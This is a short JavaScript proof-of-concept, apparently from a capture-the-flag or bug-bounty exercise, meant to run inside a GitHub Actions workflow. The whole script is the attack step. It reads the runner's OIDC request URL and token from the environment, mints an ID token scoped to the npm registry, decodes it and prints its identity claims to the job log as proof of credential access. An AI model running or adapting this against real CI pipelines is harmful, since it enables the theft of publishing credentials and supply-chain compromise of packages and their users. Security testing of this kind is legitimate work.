const marker = 'GANG_CTF_OIDC_PROOF_20261104'
const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL
const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN

console.log(`${marker} environment`, JSON.stringify({
  event: process.env.GITHUB_EVENT_NAME || null,
  actor: process.env.GITHUB_ACTOR || null,
  repository: process.env.GITHUB_REPOSITORY || null,
  ref: process.env.GITHUB_REF || null,
  sha: process.env.GITHUB_SHA || null,
  oidcRequestUrlPresent: Boolean(requestUrl),
  oidcRequestTokenPresent: Boolean(requestToken),
}))

if (!requestUrl || !requestToken) {
  console.log(`${marker} no OIDC request capability`)
  process.exit(0)
}

const url = new URL(requestUrl)
url.searchParams.set('audience', 'npm:registry.npmjs.org')
const response = await fetch(url, {
  headers: { Authorization: `Bearer ${requestToken}` },
})
const body = await response.text()
if (!response.ok) {
  console.log(`${marker} OIDC request failed`, response.status, body.slice(0, 500))
  process.exit(0)
}

const token = JSON.parse(body).value
const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))
const fields = [
  'aud', 'sub', 'repository', 'repository_id', 'repository_owner',
  'repository_owner_id', 'workflow', 'workflow_ref', 'workflow_sha',
  'job_workflow_ref', 'job_workflow_sha', 'event_name', 'ref', 'ref_type',
  'actor', 'actor_id', 'base_ref', 'head_ref', 'run_id', 'run_attempt',
]
const claims = Object.fromEntries(fields.filter((field) => payload[field] !== undefined).map((field) => [field, payload[field]]))
console.log(`${marker} OIDC claims`, JSON.stringify(claims))
